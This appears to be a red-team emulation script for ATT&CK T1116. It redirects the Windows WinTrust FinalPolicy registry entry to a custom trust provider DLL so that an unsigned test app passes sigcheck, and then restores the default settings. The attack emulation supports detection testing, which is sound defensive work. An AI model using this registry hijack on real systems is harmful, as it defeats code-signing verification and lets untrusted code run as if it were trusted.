"""
Name: Trust Provider Modification
RTA: trust_provider.py
ATT&CK: T1116
Description:
The trust_provider.py script substitutes an invalid code authentication policy, enabling a trust policy bypass.
This technique can be used by attackers to exploit trust mechanisms in Windows.
Key Features:
- Trust Policy Bypass: Modifies the Windows registry to substitute trust provider settings for executable files.
- Simulated Bypass of Code Integrity: Allows execution of untrusted applications without proper verification.
- Windows-Specific: This script modifies the Windows registry and should only run on Windows systems.
"""

import winreg as winreg
import common

FINAL_POLICY_KEY = r"Software\Microsoft\Cryptography\providers\trust\FinalPolicy\{00AAC56B-CD44-11D0-8CC2-00C04FC295EE}"


def set_final_policy(dll_path, function_name):
    hKey = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, FINAL_POLICY_KEY)

    common.log(f"Setting DLL path: {dll_path}")
    winreg.SetValueEx(hKey, "$DLL", 0, winreg.REG_SZ, dll_path)

    common.log(f"Setting function name: {function_name}")
    winreg.SetValueEx(hKey, "$Function", 0, winreg.REG_SZ, function_name)


if common.is_64bit():
    sigcheck = common.get_path("bin", "sigcheck64.exe")
    trust_provider_dll = common.get_path("bin", "TrustProvider64.dll")
else:
    sigcheck = common.get_path("bin", "sigcheck32.exe")
    trust_provider_dll = common.get_path("bin", "TrustProvider32.dll")

target_app = common.get_path("bin", "myapp.exe")


@common.dependencies(sigcheck, trust_provider_dll, target_app)
def main():
    common.log("Trust Provider Modification")
    set_final_policy(trust_provider_dll, "FinalPolicy")

    common.log("Launching sigcheck")
    common.execute([sigcheck, "-accepteula", target_app])

    common.log("Cleaning up")
    set_final_policy(r"C:\Windows\System32\WINTRUST.dll", "SoftpubAuthenticode")


if __name__ == "__main__":
    exit(main())
